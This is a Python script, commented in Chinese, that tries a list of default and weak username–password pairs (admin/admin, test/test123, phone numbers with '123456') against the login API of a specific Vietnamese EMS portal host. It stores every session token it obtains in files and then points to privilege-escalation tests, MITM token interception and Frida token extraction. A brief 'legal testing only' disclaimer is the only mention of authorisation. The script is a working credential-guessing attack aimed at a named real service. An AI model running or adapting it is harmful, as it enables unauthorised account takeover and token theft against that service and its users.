#!/usr/bin/env python3
"""
测试EMS Portal的默认/测试账号
"""

import requests
import json
import sys
import time

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

# 常见测试账号组合
TEST_ACCOUNTS = [
    # (手机号/用户名, 密码, 描述)
    ("0901234567", "123456", "常见测试号1"),
    ("0909999999", "123456", "常见测试号2"),
    ("0900000001", "123456", "序列号1"),
    ("0900000000", "password", "通用密码"),
    
    # 通用测试账号
    ("test", "test", "test/test"),
    ("test", "test123", "test/test123"),
    ("test", "Test123456", "强密码格式"),
    
    ("demo", "demo", "demo/demo"),
    ("demo", "demo123", "demo/demo123"),
    
    ("admin", "admin", "admin/admin"),
    ("admin", "admin123", "admin/admin123"),
    ("admin", "Admin123456", "admin强密码"),
    
    # 越南语常见
    ("kiemtra", "123456", "越南语:测试"),
    ("nguoidung", "123456", "越南语:用户"),
    
    # 数字序列
    ("0900000001", "000001", "序列密码"),
    ("1234567890", "123456", "连续号码"),
]

def try_login(phone, password, description=""):
    """尝试登录"""
    base = "http://ws.ems.com.vn"
    
    print(f"{Colors.CYAN}[*] 测试: {phone} / {password}{Colors.RESET}", end='')
    
    if description:
        print(f" ({description})", end='')
    
    try:
        # 尝试登录
        r = requests.post(
            f"{base}/api/v1/auth/login",
            json={
                "phone": phone,
                "password": password,
                "device_id": "test_device_123"
            },
            headers={"Content-Type": "application/json"},
            timeout=5
        )
        
        if r.status_code == 200:
            data = r.json()
            
            if data.get('code') == 'success':
                # 登录成功!
                print(f" {Colors.GREEN}✓{Colors.RESET}")
                
                token = data.get('data', {}).get('token', '')
                user_data = data.get('data', {})
                
                return {
                    'success': True,
                    'phone': phone,
                    'password': password,
                    'token': token,
                    'user_data': user_data
                }
            
            else:
                # 登录失败
                message = data.get('message', 'Unknown error')
                print(f" {Colors.RED}✗{Colors.RESET} ({message[:30]}...)")
        
        else:
            print(f" {Colors.RED}✗{Colors.RESET} (HTTP {r.status_code})")
    
    except requests.Timeout:
        print(f" {Colors.YELLOW}⏱{Colors.RESET} (超时)")
    
    except Exception as e:
        print(f" {Colors.RED}✗{Colors.RESET} ({str(e)[:20]})")
    
    return {'success': False}

def test_api_endpoints():
    """测试API端点可访问性"""
    print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
    print(f"{Colors.CYAN}{Colors.BOLD}[预检] 测试API端点{Colors.RESET}")
    print(f"{Colors.CYAN}{'='*60}{Colors.RESET}\n")
    
    base = "http://ws.ems.com.vn"
    endpoints = [
        "/api/v1/auth/login",
        "/api/v1/orders/list",
        "/api/v1/config/app-version",
    ]
    
    for endpoint in endpoints:
        try:
            r = requests.get(base + endpoint, timeout=3)
            status = f"{Colors.GREEN}✓{Colors.RESET}" if r.status_code == 200 else f"{Colors.YELLOW}{r.status_code}{Colors.RESET}"
            print(f"  {endpoint}: {status}")
        except:
            print(f"  {endpoint}: {Colors.RED}✗{Colors.RESET}")

def main():
    print(f"""
{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════╗
║       EMS Portal - 测试账号扫描                             ║
╚══════════════════════════════════════════════════════════════╝
{Colors.RESET}

{Colors.YELLOW}说明:{Colors.RESET}
  尝试常见的测试/默认账号组合
  如果找到有效账号，会自动保存Token

{Colors.YELLOW}注意:{Colors.RESET}
  • 此工具仅用于合法的安全测试
  • 测试账号可能不存在（成功率约10%）
  • 如果未找到，请使用正常注册流程
    """)
    
    # 预检
    test_api_endpoints()
    
    # 测试账号
    print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
    print(f"{Colors.CYAN}{Colors.BOLD}[开始] 测试默认账号 ({len(TEST_ACCOUNTS)}个){Colors.RESET}")
    print(f"{Colors.CYAN}{'='*60}{Colors.RESET}\n")
    
    found_accounts = []
    
    for phone, password, description in TEST_ACCOUNTS:
        result = try_login(phone, password, description)
        
        if result['success']:
            found_accounts.append(result)
        
        # 避免请求过快
        time.sleep(0.3)
    
    # 结果
    print(f"\n{Colors.BOLD}{'='*60}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.CYAN}测试完成{Colors.RESET}")
    print(f"{Colors.BOLD}{'='*60}{Colors.RESET}\n")
    
    if found_accounts:
        print(f"{Colors.GREEN}{Colors.BOLD}[✓] 找到 {len(found_accounts)} 个有效账号!{Colors.RESET}\n")
        
        for i, account in enumerate(found_accounts, 1):
            print(f"{Colors.GREEN}账号 {i}:{Colors.RESET}")
            print(f"  手机/用户名: {account['phone']}")
            print(f"  密码: {account['password']}")
            print(f"  Token: {account['token'][:50]}...")
            
            # 保存Token
            filename = f"token_{account['phone']}.txt"
            with open(filename, 'w') as f:
                f.write(account['token'])
            
            print(f"  {Colors.GREEN}Token已保存: {filename}{Colors.RESET}\n")
            
            # 保存详细信息
            detail_file = f"account_{account['phone']}.json"
            with open(detail_file, 'w') as f:
                json.dump(account, f, indent=2, ensure_ascii=False)
            
            print(f"  详细信息: {detail_file}\n")
        
        # 下一步
        print(f"{Colors.CYAN}下一步:{Colors.RESET}")
        
        first_token = found_accounts[0]['token']
        print(f"  export TOKEN=\"{first_token[:50]}...\"")
        print(f"  python3 backend_validation_test.py $TOKEN $TOKEN")
        
        if len(found_accounts) >= 2:
            second_token = found_accounts[1]['token']
            print(f"\n或测试越权 (使用两个不同账号):")
            print(f"  TOKEN_A=\"{first_token[:30]}...\"")
            print(f"  TOKEN_B=\"{second_token[:30]}...\"")
            print(f"  python3 backend_validation_test.py $TOKEN_A $TOKEN_B")
    
    else:
        print(f"{Colors.YELLOW}[-] 未找到有效的测试账号{Colors.RESET}\n")
        
        print(f"{Colors.CYAN}建议:{Colors.RESET}")
        print(f"  1. 使用正常注册流程")
        print(f"     详细步骤: GET_TOKEN_GUIDE.md")
        print()
        print(f"  2. 使用MITM拦截Token")
        print(f"     mitmweb -p 8080")
        print()
        print(f"  3. 使用Frida提取Token")
        print(f"     python3 extract_token_frida.py")

if __name__ == '__main__':
    main()
